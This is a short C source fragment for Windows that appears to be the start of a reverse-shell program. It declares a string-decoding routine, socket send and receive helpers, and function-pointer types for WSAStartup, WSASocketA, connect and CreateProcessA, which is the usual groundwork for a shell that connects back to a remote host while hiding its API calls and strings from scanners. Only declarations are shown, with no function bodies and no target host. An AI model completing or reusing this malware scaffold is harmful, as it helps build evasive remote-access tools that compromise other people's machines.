#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <bcrypt.h>
#define DEFAULT_BUFLEN 1024

char* decode(char* message, char key, int lenght);
int recv_all(SOCKET sock,char *buff,int len);
int send_all(SOCKET sock,char *buff,int len);



// Signature for WSAStartup
typedef int (WSAAPI *pWSAStartup)(
    WORD wVersionRequired, 
    LPWSADATA lpWSAData
);


// Signature for WSASocketA
typedef SOCKET (WSAAPI *pWSASocketA)(
    int af, 
    int type, 
    int protocol, 
    LPWSAPROTOCOL_INFOA lpProtocolInfo, 
    GROUP g, 
    DWORD dwFlags
);

// Signature for connect
typedef int (WSAAPI *pConnect)(
    SOCKET s, 
    const struct sockaddr *name, 
    int namelen
);
typedef BOOL (WINAPI *pCreateProcessA)(
    LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, 
    BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION
);

char* decode(char* message, char key, int lenght);

